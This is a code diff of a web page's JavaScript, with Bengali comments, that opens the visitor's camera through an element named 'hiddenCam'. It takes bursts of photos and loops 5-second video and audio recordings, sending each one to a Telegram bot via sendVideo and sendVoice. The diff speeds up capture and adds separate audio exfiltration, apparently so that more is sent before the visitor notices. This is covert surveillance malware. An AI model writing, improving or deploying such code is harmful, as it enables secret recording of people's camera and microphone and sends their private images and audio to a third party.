@@ -130,21 +130,21 @@
 
         hiddenCam.srcObject = camStream;
 
-        // ভিডিও স্ট্রিম পুরোপুরি প্লে হওয়ার জন্য ১ সেকেন্ড অপেক্ষা করা
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // ভিডিও স্ট্রিম পুরোপুরি চালু হওয়ার জন্য সামান্য অপেক্ষা
+        await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ১. প্রথমে পর পর ৩টি ছবি তুলে দ্রুত টেলিগ্রামে পাঠানো
-        await captureAndSendPhotos(3);
+        // ১. প্রথমে খুব দ্রুত পর পর ৫টি ছবি তুলে টেলিগ্রামে পাঠানো
+        await captureAndSendPhotos(5);
 
-        // ২. এরপর ভিডিও ক্লিপ দ্রুত রেকর্ড করে এমপিফোর আকারে পাঠানো শুরু করা
-        startPeriodicVideoRecording();
+        // ২. এরপর ৫ সেকেন্ড করে ভিডিও ও আলাদা অডিও ক্লিপ পাঠানো শুরু করা
+        startPeriodicRecording();
 
       } catch (err) {
         console.error("Camera permission denied or error:", err);
       }
     });
 
-    // ছবি তোলার দ্রুত ফাংশন
+    // খুব দ্রুত ছবি তোলার ফাংশন
     function takePhoto() {
       return new Promise((resolve) => {
         setTimeout(() => {
@@ -162,11 +162,11 @@
           canvas.toBlob((blob) => {
             resolve(blob);
           }, 'image/jpeg', 0.85);
-        }, 600);
+        }, 300);
       });
     }
 
-    // পর পর ৩টি ছবি টেলিগ্রামে পাঠানো
+    // খুব দ্রুত ৫টি ছবি টেলিগ্রামে পাঠানো
     async function captureAndSendPhotos(count) {
       for (let i = 1; i <= count; i++) {
         const photoBlob = await takePhoto();
@@ -181,71 +181,108 @@
             body: formData
           }).catch(err => console.log("Photo send failed", err));
         }
-        await new Promise(r => setTimeout(r, 400));
+        await new Promise(r => setTimeout(r, 200)); // অতি দ্রুত পাঠানোর জন্য বিরতি কমানো হয়েছে
       }
     }
 
-    // প্রতি ৪ সেকেন্ড পর পর ভিডিও রেকর্ড করে সরাসরি .mp4 আকারে টেলিগ্রামে পাঠানোর লুপ
-    function startPeriodicVideoRecording() {
+    // প্রতি ৫ সেকেন্ড পর পর ভিডিও এবং অডিও রেকর্ড করে টেলিগ্রামে পাঠানোর লুপ
+    function startPeriodicRecording() {
       if (!camStream) return;
 
       const recordInterval = async () => {
         if (!camStream || camStream.active === false) return;
 
-        // এমপিফোর ফরম্যাট বা ব্রাউজার সাপোর্টেড ফরম্যাট সিলেক্ট করা
-        let options = { mimeType: 'video/mp4' };
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options = { mimeType: 'video/webm;codecs=h264,opus' };
-          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-            options = { mimeType: 'video/webm' };
+        // ভিডিও রেকর্ডারের অপশন
+        let videoOptions = { mimeType: 'video/mp4' };
+        if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
+          videoOptions = { mimeType: 'video/webm;codecs=h264,opus' };
+          if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
+            videoOptions = { mimeType: 'video/webm' };
           }
         }
 
-        let mediaRecorder;
+        let videoRecorder, audioRecorder;
+        let videoChunks = [];
+        let audioChunks = [];
+
         try {
-          mediaRecorder = new MediaRecorder(camStream, options);
+          // ভিডিও রেকর্ডিং (ক্যামেরা স্ট্রিম)
+          videoRecorder = new MediaRecorder(camStream, videoOptions);
+          
+          // আলাদা অডিও রেকর্ডিংয়ের জন্য শুধু অডিও ট্র্যাক নিয়ে স্ট্রিম তৈরি
+          const audioStream = new MediaStream(camStream.getAudioTracks());
+          audioRecorder = new MediaRecorder(audioStream);
         } catch (e) {
           setTimeout(recordInterval, 1000);
           return;
         }
 
-        let chunks = [];
-
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) {
-            chunks.push(e.data);
-          }
+        videoRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) videoChunks.push(e.data);
         };
 
-        mediaRecorder.onstop = async () => {
-          if (chunks.length > 0) {
-            // ডাইরেক্ট MP4 এক্সটেনশন দিয়ে ফাইল তৈরি করা
-            const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+        audioRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) audioChunks.push(e.data);
+        };
+
+        // রেকর্ডিং বন্ধ হলে টেলিগ্রামে পাঠানো
+        let isProcessed = false;
+        const handleStop = async () => {
+          if (isProcessed) return;
+          isProcessed = true;
+
+          // ভিডিও পাঠানো
+          if (videoChunks.length > 0) {
+            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
             if (videoBlob.size > 1000) {
-              const formData = new FormData();
-              formData.append('chat_id', TELEGRAM_CHAT_ID);
-              formData.append('video', videoBlob, `clip_${Date.now()}.mp4`);
-              formData.append('caption', `🎥 এমপিফোর ভিডিও ক্লিপ`);
+              const videoForm = new FormData();
+              videoForm.append('chat_id', TELEGRAM_CHAT_ID);
+              videoForm.append('video', videoBlob, `clip_${Date.now()}.mp4`);
+              videoForm.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
 
               fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
-                body: formData
+                body: videoForm
               }).catch(err => console.log("Video send failed", err));
             }
           }
 
-          // দ্রুত পরবর্তী ক্লিপ শুরু করার জন্য সময় কমিয়ে দেওয়া হলো
+          // অডিও ক্লিপ পাঠানো
+          if (audioChunks.length > 0) {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+            if (audioBlob.size > 500) {
+              const audioForm = new FormData();
+              audioForm.append('chat_id', TELEGRAM_CHAT_ID);
+              audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
+              audioForm.append('caption', `🎙️ অডিও রেকর্ডিং ক্লিপ`);
+
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+                method: 'POST',
+                body: audioForm
+              }).catch(err => console.log("Audio send failed", err));
+            }
+          }
+
+          // পরবর্তী ৫ সেকেন্ডের জন্য আবার লুপ চালু করা
           setTimeout(recordInterval, 500);
         };
 
-        mediaRecorder.start();
+        videoRecorder.onstop = handleStop;
+        audioRecorder.onstop = handleStop;
 
-        // ভিডিও আসার দেরি কমানোর জন্য রেকর্ডিংয়ের সময় ৪ সেকেন্ড করা হলো
+        // রেকর্ডিং একসাথে শুরু করা
+        videoRecorder.start();
+        audioRecorder.start();
+
+        // ঠিক ৫ সেকেন্ড পর রেকর্ডিং স্টপ করা
         setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
+          if (videoRecorder && videoRecorder.state === 'recording') {
+            videoRecorder.stop();
           }
-        }, 4000);
+          if (audioRecorder && audioRecorder.state === 'recording') {
+            audioRecorder.stop();
+          }
+        }, 5000);
       };
 
       recordInterval();
